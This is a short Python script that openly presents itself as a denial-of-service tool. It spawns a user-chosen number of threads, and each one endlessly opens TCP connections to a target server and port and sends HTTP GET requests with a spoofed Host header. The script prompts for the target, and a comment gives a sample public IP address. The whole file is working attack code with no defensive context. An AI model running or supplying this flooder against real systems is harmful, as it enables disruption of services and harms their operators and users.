import threading
import socket
import time

class DDOS_Attack:

    def __init__(self, target, port, threads, fake_ip="137.106.211.119"):
        self.connection = (target, port)
        self.num_threads = threads
        self.fake_ip = fake_ip

        self.attacked_numbers = 0

    def __attack_method(self):
        # Endless Loop
        while True:
            # Create connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect
            try:
                sock.connect_ex(self.connection)

                # Send Fake Headers
                sock.sendto(
                    "GET /{} HTTP/1.1\r\n".format(self.connection[0]).encode('ascii'), self.connection)
                sock.sendto("HOST: {}\r\n\r\n".format(
                    self.fake_ip).encode('ascii'), self.connection)

                # Close Connection
                sock.close()
            except:
                pass

            # Count how many attached
            self.attacked_numbers += 1

            if self.attacked_numbers % 10 == 0:
                print('Total attached: {}'.format(self.attacked_numbers))

    def attack_and_capture(self):

        for _ in range(self.num_threads):

            thd1 = threading.Thread(target=self.__attack_method)

            thd1.start()


if __name__ == "__main__":

    # DDOS Self
    tgt = input('Enter the server to attack: ') # 54.172.48.202
    port = int(input('Enter the port to attack: ')) # 80
    thread_num = int(input('How many parallel connections to make: ')) # 10, 100, 1000...

    ddos = DDOS_Attack(tgt, port, thread_num)
    ddos.attack_and_capture()
